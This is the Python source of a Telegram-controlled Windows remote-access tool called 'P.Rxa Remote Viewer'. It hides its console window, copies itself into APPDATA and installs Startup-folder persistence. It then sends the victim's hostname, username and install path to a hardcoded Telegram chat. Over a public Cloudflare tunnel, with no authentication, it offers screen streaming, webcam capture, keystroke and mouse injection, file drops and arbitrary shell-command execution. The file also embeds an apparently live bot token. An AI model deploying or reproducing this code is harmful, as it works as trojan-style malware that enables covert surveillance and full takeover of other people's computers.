import os
import sys
import time
import cv2
import mss
import numpy as np
import telebot
import threading
import subprocess
import re
import pyautogui
import ctypes
import psutil
import json
import socket
import random
from flask import Flask, Response, render_template_string, request, send_file
from telebot import types
import shutil
import logging
log_path = os.path.join(os.getenv('TEMP', os.getcwd()), 'prxa_bot.log')
logging.basicConfig(filename=log_path, level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

def log_print(*args):
    msg = " ".join(map(str, args))
    logging.info(msg)


# ─────────────────────────────────────────────
#  REGISTRY & HEARTBEAT HELPERS
# ─────────────────────────────────────────────
def register_device(device_name, url):
    try:
        chat = bot.get_chat(AUTHORIZED_USER_ID)
        pinned_msg = chat.pinned_message
        
        devices = {}
        if pinned_msg and pinned_msg.text:
            m = re.search(r'```json\s*(\{.*?\})\s*```', pinned_msg.text, re.DOTALL)
            if m:
                try:
                    loaded = json.loads(m.group(1))
                    if isinstance(loaded, dict):
                        devices = loaded
                except Exception as e:
                    log_print(f"Error parsing registry JSON: {e}")
        
        now = time.time()
        active_devices = {}
        for name, info in devices.items():
            if isinstance(info, dict) and "url" in info and "time" in info:
                # Keep only active devices (heartbeat in last 180 seconds)
                if now - info["time"] < 180:
                    active_devices[name] = info
        
        active_devices[device_name] = {"url": url, "time": now}
        
        new_text = "🖥️ *P.Rxa Active Devices Registry*\n"
        new_text += "━━━━━━━━━━━━━━━━━━━━\n"
        for name, info in active_devices.items():
            u = info["url"]
            new_text += f"💻 *{name}*\n"
            new_text += f"🔗 WebApp: [Open Stream]({u})\n"
            new_text += f"🔗 Browser: {u}\n\n"
        
        new_text += "```json\n" + json.dumps(active_devices) + "\n```"
        
        bot_id = bot.get_me().id
        if pinned_msg and pinned_msg.from_user.id == bot_id:
            if pinned_msg.text != new_text:
                bot.edit_message_text(chat_id=AUTHORIZED_USER_ID, message_id=pinned_msg.message_id, text=new_text, parse_mode='Markdown', disable_web_page_preview=True)
        else:
            msg = bot.send_message(AUTHORIZED_USER_ID, new_text, parse_mode='Markdown', disable_web_page_preview=True)
            bot.pin_chat_message(chat_id=AUTHORIZED_USER_ID, message_id=msg.message_id, disable_notification=True)
            
    except Exception as e:
        log_print(f"register_device error: {e}")

def device_heartbeat_loop():
    dev_name = socket.gethostname()
    while True:
        time.sleep(60 + random.randint(0, 5))
        if PUBLIC_URL:
            register_device(dev_name, PUBLIC_URL)



# ─────────────────────────────────────────────
#  HIDE BLACK TERMINAL
# ─────────────────────────────────────────────
if os.name == 'nt':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ─────────────────────────────────────────────
#  CONFIGURATION
# ─────────────────────────────────────────────
BOT_TOKEN          = "8634607141:AAFRkJNcRXwLtJ0GceL4w2LRUM3NvvQXKnM"
AUTHORIZED_USER_ID = "6835758453"

PUBLIC_URL   = None
tunnel_proc  = None
bot          = telebot.TeleBot(BOT_TOKEN)
app          = Flask(__name__)

# ─────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────
def install_to_appdata():
    try:
        if getattr(sys, 'frozen', False): current_path = sys.executable
        else: current_path = os.path.abspath(__file__)
        fname = os.path.basename(current_path)
        appdata_dir = os.path.join(os.getenv('APPDATA'), "PRxaRemote")
        os.makedirs(appdata_dir, exist_ok=True)
        target_path = os.path.join(appdata_dir, fname)
        if os.path.abspath(current_path).lower() != os.path.abspath(target_path).lower():
            shutil.copy2(current_path, target_path)
            log_print(f"Copied to {target_path}")
        return target_path
    except Exception as e:
        log_print(f"Install error: {e}")
        return getattr(sys, 'frozen', getattr(sys, 'executable', __file__))

def enable_startup(script_path=None):
    try:
        folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        bat    = os.path.join(folder, "PRxa_Remote.bat")
        if not script_path:
            script_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        if getattr(sys, 'frozen', False):
            with open(bat, "w") as f: f.write(f'@echo off\ncd /d "{os.path.dirname(script_path)}"\nstart "" "{script_path}"\n')
        else:
            with open(bat, "w") as f: f.write(f'@echo off\ncd /d "{os.path.dirname(script_path)}"\nstart "" pythonw "{script_path}"\n')
        return True
    except: return False

def restricted(func):
    def wrapper(message):
        if str(message.chat.id) != AUTHORIZED_USER_ID:
            bot.reply_to(message, "⛔ Unauthorized")
            return
        return func(message)
    return wrapper

def start_tunnel():
    global PUBLIC_URL, tunnel_proc
    if tunnel_proc:
        try:
            subprocess.run(["taskkill", "/F", "/IM", "cloudflared.exe", "/T"],
                           capture_output=True, stdin=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
            tunnel_proc.terminate()
        except Exception as e:
            log_print(f"Taskkill error: {e}")
    log_print("Starting Tunnel…")
    try:
        tunnel_proc = subprocess.Popen(
            ["npx", "cloudflared", "tunnel", "--url", "http://localhost:5000"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE,
            text=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        for line in iter(tunnel_proc.stdout.readline, ''):
            if "trycloudflare.com" in line:
                m = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                if m:
                    PUBLIC_URL = m.group(0)
                    log_print(f"Link: {PUBLIC_URL}")
                    try:
                        markup = types.InlineKeyboardMarkup()
                        markup.add(
                            types.InlineKeyboardButton("🌐 WebApp", web_app=types.WebAppInfo(PUBLIC_URL)),
                            types.InlineKeyboardButton("🔗 Browser", url=PUBLIC_URL)
                        )
                        installed_path = install_to_appdata()
                        enable_startup(installed_path)
                        dev_name = socket.gethostname()
                        try:
                            username = os.getlogin()
                        except Exception:
                            username = os.getenv('USERNAME') or os.getenv('USER') or 'Unknown'
                        bot.send_message(AUTHORIZED_USER_ID,
                            f"♻️ *P.Rxa Bot Online!*\n\n"
                            f"🖥️ *Device:* `{dev_name}`\n"
                            f"👤 *User:* `{username}`\n"
                            f"📁 *Path:* `{installed_path}`\n"
                            f"📺 {PUBLIC_URL}",
                            reply_markup=markup,
                            parse_mode='Markdown')
                        log_print("Message sent successfully")
                        try:
                            register_device(socket.gethostname(), PUBLIC_URL)
                        except Exception as reg_err:
                            log_print(f"Initial register error: {reg_err}")
                    except Exception as e: 
                        log_print(f"Send link error: {e}")
                    break
    except Exception as e:
        log_print(f"Tunnel Error: {e}")

def run_flask():
    app.run(host='0.0.0.0', port=5000, threaded=True,
            debug=False, use_reloader=False)

# ─────────────────────────────────────────────
#  FLASK — STREAM
# ─────────────────────────────────────────────
def gen_frames():
    with mss.MSS() as sct:
        monitor = sct.monitors[1]
        while True:
            img    = sct.grab(monitor)
            frame  = np.array(img)
            frame  = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
            frame  = cv2.resize(frame, (1280, 720))
            _, buf = cv2.imencode('.jpg', frame,
                                  [int(cv2.IMWRITE_JPEG_QUALITY), 75])
            yield (b'--frame\r\nContent-Type: image/jpeg\r\n\r\n'
                   + buf.tobytes() + b'\r\n')

# ─────────────────────────────────────────────
#  FLASK — API ROUTES
# ─────────────────────────────────────────────
@app.route('/api/click/<int:x>/<int:y>')
def api_click(x, y):
    try:
        sw, sh = pyautogui.size()
        pyautogui.click(int(x*sw/1280), int(y*sh/720))
        return "OK"
    except: return "Error", 500

@app.route('/api/open_url')
def api_open_url():
    url = request.args.get('url', '')
    if not url: return "Missing", 400
    if not url.startswith('http'): url = 'https://' + url
    try: subprocess.Popen(["start", url], shell=True); return "OK"
    except: return "Error", 500

@app.route('/api/launch/<app_name>')
def api_launch(app_name):
    try:
        if   app_name == "chrome":   subprocess.Popen(["start","chrome"], shell=True)
        elif app_name == "notepad":  subprocess.Popen(["notepad.exe"])
        elif app_name == "youtube":  subprocess.Popen(["start","https://youtube.com"], shell=True)
        return "OK"
    except: return "Error", 500

@app.route('/api/jump_mouse')
def api_jump_mouse():
    try: w,h=pyautogui.size(); pyautogui.moveTo(w//2,h//2); return "OK"
    except: return "Error", 500

@app.route('/api/monitor/<action>')
def api_monitor(action):
    try:
        if action == "off":
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        elif action == "on":
            pyautogui.moveRel(1,0); pyautogui.moveRel(-1,0)
        return "OK"
    except: return "Error", 500

@app.route('/api/desktop/<action>')
def api_desktop(action):
    try:
        if action == "toggle_icons":
            hwnd = ctypes.windll.user32.FindWindowExW(0, 0, "Progman", None)
            shell_dll = ctypes.windll.user32.FindWindowExW(hwnd, 0, "SHELLDLL_DefView", None)
            if shell_dll == 0:
                curr = ctypes.windll.user32.FindWindowExW(0, 0, "WorkerW", None)
                while curr != 0:
                    shell_dll = ctypes.windll.user32.FindWindowExW(curr, 0, "SHELLDLL_DefView", None)
                    if shell_dll != 0: break
                    curr = ctypes.windll.user32.FindWindowExW(0, curr, "WorkerW", None)
            if shell_dll != 0:
                ctypes.windll.user32.SendMessageW(shell_dll, 0x0111, 0x7402, 0)
        return "OK"
    except: return "Error", 500

@app.route('/api/webcam')
def api_webcam():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened(): return "No Webcam", 404
        ret, frame = cap.read()
        cap.release()
        if not ret: return "Failed to read", 500
        _, buf = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 85])
        return Response(buf.tobytes(), mimetype='image/jpeg')
    except Exception as e: return f"Error: {e}", 500

@app.route('/api/keyboard/<action>')
def api_keyboard(action):
    try:
        m = {"minimize_all": lambda: pyautogui.hotkey('win','d'),
             "alt_tab":      lambda: pyautogui.hotkey('alt','tab'),
             "close_window": lambda: pyautogui.hotkey('alt','f4'),
             "enter":        lambda: pyautogui.press('enter'),
             "escape":       lambda: pyautogui.press('escape'),
             "task_manager": lambda: pyautogui.hotkey('ctrl','shift','esc')}
        if action in m: m[action]()
        return "OK"
    except: return "Error", 500

@app.route('/api/type_text')
def api_type_text():
    text = request.args.get('text', '')
    if not text: return "Missing", 400
    try: pyautogui.write(text, interval=0.03); return "OK"
    except: return "Error", 500

@app.route('/api/exec_cmd')
def api_exec_cmd():
    cmd = request.args.get('cmd', '')
    if not cmd: return "Missing", 400
    try: subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW); return "OK"
    except: return "Error", 500

@app.route('/api/volume/<action>')
def api_volume(action):
    try:
        {"up": lambda: pyautogui.press("volumeup"),
         "down": lambda: pyautogui.press("volumedown"),
         "mute": lambda: pyautogui.press("volumemute")}[action]()
        return "OK"
    except: return "Error", 500

@app.route('/api/media/<action>')
def api_media(action):
    try:
        {"play": lambda: pyautogui.press("playpause"),
         "next": lambda: pyautogui.press("nexttrack"),
         "prev": lambda: pyautogui.press("prevtrack")}[action]()
        return "OK"
    except: return "Error", 500

@app.route('/api/power/<action>')
def api_power(action):
    try:
        if action == "lock":     ctypes.windll.user32.LockWorkStation()
        elif action == "sleep":  os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
        elif action == "shutdown": os.system("shutdown /s /t 1")
        return "OK"
    except: return "Error", 500

@app.route('/api/stats')
def api_stats():
    bat = psutil.sensors_battery()
    return json.dumps({"cpu": psutil.cpu_percent(),
                       "ram": psutil.virtual_memory().percent,
                       "batt": bat.percent if bat else 0,
                       "plug": bat.power_plugged if bat else False})

@app.route('/api/change_bg', methods=['POST'])
def api_change_bg():
    if 'file' not in request.files: return "No file", 400
    path = os.path.join(os.getcwd(), "wallpaper.jpg")
    request.files['file'].save(path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    return "OK"

@app.route('/api/upload_file', methods=['POST'])
def api_upload_file():
    """Receive a file from Telegram bot and make it available for download."""
    if 'file' not in request.files: return "No file", 400
    f = request.files['file']
    path = os.path.join(os.getcwd(), "shared_" + f.filename)
    f.save(path)
    return json.dumps({"path": path})

@app.route('/api/devices')
def api_devices():
    try:
        chat = bot.get_chat(AUTHORIZED_USER_ID)
        pinned_msg = chat.pinned_message
        
        devices = {}
        if pinned_msg and pinned_msg.text:
            m = re.search(r'```json\s*(\{.*?\})\s*```', pinned_msg.text, re.DOTALL)
            if m:
                try:
                    loaded = json.loads(m.group(1))
                    if isinstance(loaded, dict):
                        devices = loaded
                except Exception as e:
                    log_print(f"Error parsing registry JSON: {e}")
        
        now = time.time()
        current_host = socket.gethostname()
        device_list = []
        for name, info in devices.items():
            if isinstance(info, dict) and "url" in info and "time" in info:
                is_current = (name == current_host)
                if is_current or (now - info["time"] < 180):
                    device_list.append({
                        "name": name,
                        "url": PUBLIC_URL if is_current else info["url"],
                        "is_current": is_current
                    })
        
        if not any(d["is_current"] for d in device_list) and PUBLIC_URL:
            device_list.append({
                "name": current_host,
                "url": PUBLIC_URL,
                "is_current": True
            })
            
        return Response(json.dumps(device_list), mimetype='application/json')
    except Exception as e:
        log_print(f"api_devices error: {e}")
        return Response(json.dumps([]), mimetype='application/json')

@app.route('/video_feed')
def video_feed():
    return Response(gen_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

# ─────────────────────────────────────────────
#  WEB UI
# ─────────────────────────────────────────────
@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>P.Rxa Vision - Master Control</title>
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&display=swap');
    *{box-sizing:border-box}
    body{margin:0;background:#050505;color:#fff;font-family:'Outfit',sans-serif;
         display:flex;height:100vh;overflow:hidden;align-items:center;justify-content:center}
    .container{position:relative;width:100vw;height:100vh;display:flex;
               align-items:center;justify-content:center;
               background:radial-gradient(circle at center,#111 0%,#050505 100%)}
    #stream{max-width:100%;max-height:100%;object-fit:contain;
            box-shadow:0 0 50px rgba(0,0,0,.5);border-radius:8px;cursor:crosshair}
    .stats{position:absolute;top:20px;left:100px;display:flex;gap:12px;
           font-size:10px;font-weight:600;opacity:.85;z-index:10}
    .stat-box{background:rgba(255,255,255,.05);padding:5px 10px;border-radius:10px;
              backdrop-filter:blur(5px);border:1px solid rgba(255,255,255,.1)}
    .badge{position:absolute;top:20px;left:20px;background:rgba(255,0,0,.15);
           color:#ff4d4d;padding:8px 16px;border-radius:20px;font-size:11px;
           font-weight:600;letter-spacing:1.5px;display:flex;align-items:center;
           gap:8px;backdrop-filter:blur(10px);border:1px solid rgba(255,0,0,.2);z-index:10}
    .dot{width:8px;height:8px;background:#ff4d4d;border-radius:50%;
         box-shadow:0 0 10px #ff4d4d;animation:pulse 1.5s infinite}
    @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(1.2)}}
    .panel{position:fixed;right:20px;top:50%;transform:translateY(-50%);
           background:rgba(15,15,15,.75);backdrop-filter:blur(20px);
           border:1px solid rgba(255,255,255,.1);border-radius:24px;padding:18px;
           display:flex;flex-direction:column;gap:10px;z-index:100;
           box-shadow:0 20px 40px rgba(0,0,0,.5);
           transition:all .4s cubic-bezier(.4,0,.2,1);width:170px;
           max-height:92vh;overflow-y:auto;scrollbar-width:none}
    .panel.hidden{transform:translate(130%,-50%);opacity:0}
    .lbl{font-size:8px;opacity:.35;text-transform:uppercase;letter-spacing:1.5px;margin-top:4px}
    .btn{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);
         color:#fff;padding:9px 6px;border-radius:12px;cursor:pointer;display:flex;
         align-items:center;justify-content:center;gap:6px;font-size:11px;
         transition:all .2s ease;font-family:'Outfit',sans-serif}
    .btn:hover{background:rgba(255,255,255,.18);transform:translateX(-3px)}
    .row{display:grid;grid-template-columns:repeat(3,1fr);gap:5px}
    .btn.blue{background:#007bff;border:none}
    .btn.red{background:#dc3545;border:none}
    .btn.green{background:#28a745;border:none}
    .toggle{position:fixed;right:20px;bottom:20px;width:50px;height:50px;
            background:rgba(255,255,255,.1);backdrop-filter:blur(10px);
            border:1px solid rgba(255,255,255,.2);border-radius:50%;
            display:flex;align-items:center;justify-content:center;
            cursor:pointer;z-index:101;font-size:20px;transition:all .3s ease}
    .toggle:hover{transform:rotate(90deg) scale(1.1);background:rgba(255,255,255,.2)}
    .wm{position:absolute;bottom:20px;left:20px;opacity:.18;font-size:11px;
        letter-spacing:3px;text-transform:uppercase}
    .device-container{position:absolute;top:20px;right:20px;z-index:10;display:none}
    .device-select{background:rgba(15,15,15,.75);backdrop-filter:blur(20px);
                   border:1px solid rgba(255,255,255,.1);border-radius:12px;
                   color:#fff;padding:8px 16px;font-family:'Outfit',sans-serif;
                   font-size:11px;font-weight:600;outline:none;cursor:pointer;
                   box-shadow:0 10px 20px rgba(0,0,0,.3);transition:all .3s ease}
    .device-select:hover{background:rgba(255,255,255,.1);border-color:rgba(255,255,255,.2)}
    .device-select option{background:#111;color:#fff}
    @media (max-width: 600px) {
        .panel { right: 10px; width: 140px; padding: 12px; }
        .btn { padding: 10px 5px; font-size: 10px; }
        .stats { left: 10px; top: 10px; flex-direction: column; gap: 5px; }
        .badge { display: none; }
        .toggle { width: 40px; height: 40px; font-size: 16px; bottom: 10px; right: 10px; }
        .device-container { top: 10px; right: 10px; }
    }
  </style>
</head>
<body>
<div class="container">
  <div class="badge"><div class="dot"></div>LIVE</div>
  <div class="stats">
    <div class="stat-box">CPU <span id="cpu">—</span></div>
    <div class="stat-box">RAM <span id="ram">—</span></div>
    <div class="stat-box">BATT <span id="batt">—</span></div>
  </div>
  <div class="device-container" id="devContainer">
    <select class="device-select" id="devSelect" onchange="switchDevice(this.value)">
    </select>
  </div>
  <img id="stream" src="/video_feed" onclick="handleClick(event)">
  <div class="wm">P.Rxa Remote Viewer</div>
</div>
<div class="toggle" onclick="togglePanel()">⚙️</div>
<div class="panel" id="panel">
  <div class="lbl">Privacy</div>
  <button class="btn" id="monBtn" onclick="toggleMon()">🖥️ Monitor Off</button>
  <button class="btn" onclick="api('power/lock')">🔒 Lock</button>
  <button class="btn" onclick="snapWebcam()">📷 Webcam Snap</button>

  <div class="lbl">Workspace</div>
  <button class="btn" onclick="api('keyboard/minimize_all')">🗄️ Show Desktop</button>
  <button class="btn" onclick="api('desktop/toggle_icons')">👻 Toggle Icons</button>
  <button class="btn" onclick="api('keyboard/close_window')">❌ Close Window</button>
  <button class="btn" onclick="api('keyboard/task_manager')">📊 Task Mgr</button>
  <button class="btn" onclick="api('jump_mouse')">🎯 Center Mouse</button>

  <div class="lbl">Smart Input</div>
  <button class="btn" onclick="typeText()">⌨️ Type Text</button>
  <button class="btn" onclick="openURL()">🌐 Open URL</button>
  <button class="btn" onclick="execCmd()">⚡ Exec CMD</button>
  <div class="row">
    <button class="btn" title="Alt+Tab" onclick="api('keyboard/alt_tab')">🔀</button>
    <button class="btn" title="Enter"   onclick="api('keyboard/enter')">↩️</button>
    <button class="btn" title="Escape"  onclick="api('keyboard/escape')">⛔</button>
  </div>

  <div class="lbl">Apps</div>
  <div class="row">
    <button class="btn" title="Chrome"  onclick="api('launch/chrome')">🌐</button>
    <button class="btn" title="YouTube" onclick="api('launch/youtube')">🎬</button>
    <button class="btn" title="Notepad" onclick="api('launch/notepad')">📝</button>
  </div>

  <div class="lbl">Audio · Media</div>
  <div class="row">
    <button class="btn" onclick="api('volume/up')">🔊</button>
    <button class="btn" onclick="api('volume/down')">🔉</button>
    <button class="btn" onclick="api('volume/mute')">🔇</button>
  </div>
  <div class="row">
    <button class="btn" onclick="api('media/prev')">⏮️</button>
    <button class="btn" onclick="api('media/play')">⏯️</button>
    <button class="btn" onclick="api('media/next')">⏭️</button>
  </div>

  <hr style="opacity:.08;margin:4px 0">
  <input type="file" id="bg" style="display:none" onchange="uploadBG(this)">
  <button class="btn blue" onclick="document.getElementById('bg').click()">🖼️ Wallpaper</button>
  <button class="btn red"  onclick="if(confirm('Sleep?'))api('power/sleep')">💤 Sleep</button>
</div>
<script>
  function togglePanel(){document.getElementById('panel').classList.toggle('hidden')}
  let monOff=false;
  function toggleMon(){
    const b=document.getElementById('monBtn');
    if(!monOff){fetch('/api/monitor/off');b.textContent='🖥️ Monitor On';b.className='btn green';monOff=true;}
    else{fetch('/api/monitor/on');b.textContent='🖥️ Monitor Off';b.className='btn';monOff=false;}
  }
  function snapWebcam(){
    const w = window.open('', '_blank', 'width=800,height=600');
    w.document.write('<html><body style="margin:0;background:#000;display:flex;align-items:center;justify-content:center;"><img src="/api/webcam?' + new Date().getTime() + '" style="max-width:100%;max-height:100%;"></body></html>');
  }
  function handleClick(e){
    const r=e.target.getBoundingClientRect();
    fetch(`/api/click/${Math.round((e.clientX-r.left)*1280/r.width)}/${Math.round((e.clientY-r.top)*720/r.height)}`);
  }
  function api(ep){fetch('/api/'+ep)}
  function openURL(){const u=prompt('URL (e.g. google.com):');if(u)fetch('/api/open_url?url='+encodeURIComponent(u))}
  function typeText(){const t=prompt('Text to type on PC:');if(t)fetch('/api/type_text?text='+encodeURIComponent(t))}
  function execCmd(){const c=prompt('Command to execute:');if(c)fetch('/api/exec_cmd?cmd='+encodeURIComponent(c))}
  function uploadBG(inp){
    if(!inp.files[0])return;
    const fd=new FormData();fd.append('file',inp.files[0]);
    fetch('/api/change_bg',{method:'POST',body:fd}).then(r=>alert(r.ok?'Wallpaper set!':'Failed'));
  }
  function updateStats(){
    fetch('/api/stats').then(r=>r.json()).then(d=>{
      document.getElementById('cpu').textContent=d.cpu+'%';
      document.getElementById('ram').textContent=d.ram+'%';
      document.getElementById('batt').textContent=d.batt+'%'+(d.plug?'⚡':'');
    });
  }
  setInterval(updateStats,3000);updateStats();

  function switchDevice(url){
    if(url && !url.includes(window.location.host)){
      window.location.href = url;
    }
  }
  function updateDevices(){
    fetch('/api/devices').then(r=>r.json()).then(d=>{
      const sel=document.getElementById('devSelect');
      const container=document.getElementById('devContainer');
      if(!d || d.length <= 1){
        container.style.display='none';
        return;
      }
      container.style.display='block';
      let html='';
      d.forEach(dev=>{
        const isCurrent = dev.is_current ? ' selected' : '';
        const displayName = dev.name + (dev.is_current ? ' (Current)' : '');
        html += `<option value="${dev.url}"${isCurrent}>🖥️ ${displayName}</option>`;
      });
      sel.innerHTML=html;
    }).catch(err=>console.error("error updating devices:", err));
  }
  setInterval(updateDevices,10000);updateDevices();
</script>
</body>
</html>
""")

# ─────────────────────────────────────────────
#  BOT COMMANDS
# ─────────────────────────────────────────────
@bot.message_handler(commands=['start','help'])
@restricted
def cmd_start(message):
    link = PUBLIC_URL or '⏳ connecting…'
    dev_name = socket.gethostname()
    try:
        username = os.getlogin()
    except Exception:
        username = os.getenv('USERNAME') or os.getenv('USER') or 'Unknown'
    bot.reply_to(message,
        f"🚀 *P.Rxa Remote Viewer*\n\n"
        f"🖥️ *Device:* `{dev_name}` (`{username}`)\n\n"
        f"📺 /live — Open stream\n"
        f"♻️ /relink — Refresh link\n"
        f"⚙️ /startup — Auto-start\n"
        f"📷 /webcam — Webcam Snapshot\n"
        f"📤 /upload — Upload a file to PC\n"
        f"⬇️ /exec — Download Client\n\n"
        f"🔗 {link}", parse_mode='Markdown')

@bot.message_handler(commands=['live'])
@restricted
def cmd_live(message):
    if not PUBLIC_URL:
        bot.reply_to(message, "⏳ Tunnel not ready yet."); return
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("🌐 WebApp", web_app=types.WebAppInfo(PUBLIC_URL)),
        types.InlineKeyboardButton("🔗 Browser", url=PUBLIC_URL)
    )
    dev_name = socket.gethostname()
    bot.send_message(message.chat.id, f"🎬 *Tap to open stream for `{dev_name}`:*",
                     reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['relink'])
@restricted
def cmd_relink(message):
    dev_name = socket.gethostname()
    bot.reply_to(message, f"♻️ *Refreshing `{dev_name}`…* wait ~15 s.")
    threading.Thread(target=start_tunnel, daemon=True).start()

@bot.message_handler(commands=['startup'])
@restricted
def cmd_startup(message):
    installed_path = install_to_appdata()
    dev_name = socket.gethostname()
    if enable_startup(installed_path):
        bot.reply_to(message, f"✅ *Startup enabled on `{dev_name}`!*\n📁 `{installed_path}`", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"❌ Failed on `{dev_name}` — run as Administrator.", parse_mode='Markdown')

@bot.message_handler(commands=['upload'])
@restricted
def cmd_upload(message):
    dev_name = socket.gethostname()
    bot.reply_to(message, f"📎 Send me any file and I'll save it to the PC on `{dev_name}`.")

@bot.message_handler(commands=['exec', 'cmd'])
@restricted
def cmd_exec(message):
    url = "https://github.com/ItzRealRxa/PRxa-Remote/releases/download/v5/tg.exe"
    bot.reply_to(message, f"📦 *Download P.Rxa Remote v5:*\n\n[Click here to download]({url})\n\nOr use this direct link:\n`{url}`", parse_mode='Markdown', disable_web_page_preview=True)

@bot.message_handler(commands=['webcam'])
@restricted
def cmd_webcam(message):
    dev_name = socket.gethostname()
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened(): bot.reply_to(message, f"❌ No webcam found on `{dev_name}`."); return
        ret, frame = cap.read()
        cap.release()
        if not ret: bot.reply_to(message, f"❌ Failed to capture on `{dev_name}`."); return
        _, buf = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 85])
        bot.send_photo(message.chat.id, buf.tobytes(), caption=f"📷 *Live Webcam Snapshot from `{dev_name}`*", parse_mode='Markdown')
    except Exception as e: bot.reply_to(message, f"❌ Error on `{dev_name}`: {e}")

@bot.message_handler(content_types=['document','photo','video','audio'])
def handle_file(message):
    if str(message.chat.id) != AUTHORIZED_USER_ID: return
    dev_name = socket.gethostname()
    try:
        if message.document:
            fi = bot.get_file(message.document.file_id)
            fname = message.document.file_name
        elif message.photo:
            fi = bot.get_file(message.photo[-1].file_id)
            fname = "photo.jpg"
        elif message.video:
            fi = bot.get_file(message.video.file_id)
            fname = "video.mp4"
        elif message.audio:
            fi = bot.get_file(message.audio.file_id)
            fname = "audio.mp3"
        else:
            return
        data  = bot.download_file(fi.file_path)
        path  = os.path.join(os.path.expanduser("~/Downloads"), fname)
        with open(path, 'wb') as f:
            f.write(data)
        bot.reply_to(message, f"✅ *Saved to Downloads on `{dev_name}`:*\n`{fname}`", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ Failed on `{dev_name}`: {e}")

# ─────────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────────
if __name__ == "__main__":
    threading.Thread(target=start_tunnel, daemon=True).start()
    threading.Thread(target=run_flask,    daemon=True).start()
    threading.Thread(target=device_heartbeat_loop, daemon=True).start()
    log_print("P.Rxa Bot starting…")
    bot.infinity_polling(skip_pending=True)
